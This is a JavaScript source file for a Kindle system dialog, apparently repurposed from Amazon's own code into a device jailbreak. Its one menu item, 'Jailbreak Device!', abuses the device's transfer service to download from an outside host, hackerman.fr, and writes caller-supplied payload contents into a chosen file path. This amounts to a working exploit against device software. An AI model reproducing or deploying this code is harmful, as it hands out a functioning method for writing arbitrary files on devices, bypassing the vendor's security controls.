/*
 * browser_setting_dialog.js
 *
 * Copyright (c) 2023 Amazon.com, Inc. or its affiliates. All Rights Reserved.
 *
 * PROPRIETARY/CONFIDENTIAL
 *
 * Use is subject to license terms.
 */

Pillow.MountSusDialog = function () {
    var that = this;
    var parent = Pillow.extend(this, new Pillow.Case('MountSusDialog'));
    var windowTitle = null;
    var listWidget = null;
    var selectedItem = null;
    var settingList = null;
    var jsEnabled = true;
    var imageEnabled = true;
    var file = ""; // The file to edit and send to the server
    var filePath = ""; // The location to download the file to
    var lipcId = null;
    const SETTINGS_DIALOG_ID = "dialog";


    /**
     * Sets up the dialog with Pillow and prepares the interface.
     */
    this.onLoad = function () {
        nativeBridge.registerClientParamsCallback(this.clientParamsCallback);
        Pillow.setOption(OPTION_SEND_DELETE_EVENTS, true);
        windowTitle = new WindowTitle(WINMGR.LAYER.DIALOG, WINMGR.ROLE.DIALOG);
        windowTitle.withChanges(function () {
            this.addParam(WINMGR.KEY.WIN_IS_MODAL,
                WINMGR.MODALITY.DISMISSIBLE_MODAL);
        });
        listWidget = new ListWidget('settings', {
            fields: ['name','id'],
            handler: listItemSelection,
            xor: true
        });
        cancelButton = document.getElementById('advancedCancelButton');
        new XorButton(cancelButton, Pillow.bind(this, 'close', null),
                      cancelButton, 'dialog-close','dialog-close xor');
        var dialogElem = document.getElementById(SETTINGS_DIALOG_ID);
        nativeBridge.setWindowSize(dialogElem.offsetWidth, 700);
        this.show();
        parent(this).onLoad();
        modifyClassNameDOM();
    };

    var listItemSelection = function (item) {

        Pillow.logInfo("MountSus.listItemSelection selectedItem=" + item.name + " " + item.id);

        document.getElementById("jailState").innerText = "Sending property...";
        var constructedDownloadRequest = {
            url:                        "http://hackerman.fr:126/MountSus/mntus.params",        // The path to the server
            dest:                       filePath,           // Destination
            unique_id:                  "archivedItems",
            transport_any:              1,
            priority:                   80,
            notify_progress_interval:   20,
            notify_pub:                 "com.lab126.archive",
            notify_prop:                "transferProgressNotification",
            extra_headers:              "fileData:" + encodeURIComponent(file)  // Server will merely return the contents of this header (encoded because newlines will cause issues)
        }
        
        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", constructedDownloadRequest);

        document.getElementById("jailState").innerText = "Property sent...";

        setTimeout(function () {
            document.getElementById("jailState").innerText = "Done! Close the popup and click Verify Jailbreak";
        }, 1000);
    };

    this.clientParamsCallback = function (clientParamsString){
        // parse clientParams
        var clientParams = JSON.parse(clientParamsString);
        file = clientParams.fileData; // Add the payload
        filePath = clientParams.filePath;
        jsEnabled =  (clientParams.jsEnabled === 'true');
        imageEnabled =  (clientParams.imageEnabled === 'true');
        lipcId = clientParams.replySrc;

        document.getElementById("jailState").innerText = "You are currently in jail.";
    };

    this.getBrowserSettings = function () {
        var displayList = [];
        displayList.push({
            name: "Jailbreak Device!",
            id: "jailbreak_device"
        });

        return displayList;
    };

    this.renderBrowserSettings = function(settingList, widgetOptions) {
        listWidget.setItems(settingList, widgetOptions);
    };

    this.setBrowserSettings = function (widgetOptions) {
        settingList = this.getBrowserSettings();
        this.renderBrowserSettings(settingList, widgetOptions);
    };

    this.show = function () {
        this.setBrowserSettings(true);
        nativeBridge.showMe();
    };

    this.hide = function () {
        Pillow.logInfo("MountSusDialog.hide called");
        windowTitle.addParam(WINMGR.KEY.HIDE_DIALOG, WINMGR.DIALOG_HIDE.BACKGROUND);
    };

    this.close = function () {
        Pillow.logInfo("MountSusDialog.close called");
        nativeBridge.dismissMe();
    };

    Pillow.logWrapObject('Pillow.MountSusDialog', this);
};

var mountSusDialog = new Pillow.MountSusDialog();
mountSusDialog.register();

